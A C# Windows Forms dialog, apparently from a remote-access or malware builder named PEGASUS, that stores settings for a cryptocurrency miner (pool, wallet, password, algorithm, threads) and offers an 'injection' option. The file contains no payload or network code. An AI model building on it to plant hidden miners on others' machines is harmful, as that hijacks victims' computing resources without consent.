using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FormMiner : Form
    {
        public FormMiner()
        {
            InitializeComponent();
        }

        private void FormMiner_Load(object sender, EventArgs e)
        {
            try
            {
                comboInjection.SelectedIndex = 1;
                txtPool.Text = Properties.Settings.Default.pool;
                txtWallet.Text = Properties.Settings.Default.wallet;
                txtPass.Text = Properties.Settings.Default.password;
                comboInjection.Text = Properties.Settings.Default.algo;
                txtThreads.Text = Properties.Settings.Default.threads;
            }
            catch
            {
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrWhiteSpace(txtPool.Text) && !string.IsNullOrWhiteSpace(txtWallet.Text) &&
                !string.IsNullOrWhiteSpace(txtPass.Text) && !string.IsNullOrWhiteSpace(comboInjection.Text) &&
                !string.IsNullOrWhiteSpace(txtThreads.Text))
            {
                DialogResult = DialogResult.OK;
                Properties.Settings.Default.pool = txtPool.Text;
                Properties.Settings.Default.wallet = txtWallet.Text;
                Properties.Settings.Default.password = txtPass.Text;
                Properties.Settings.Default.algo = comboInjection.Text;
                Properties.Settings.Default.threads = txtThreads.Text;
                Properties.Settings.Default.Save();
                Hide();
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }
    }
}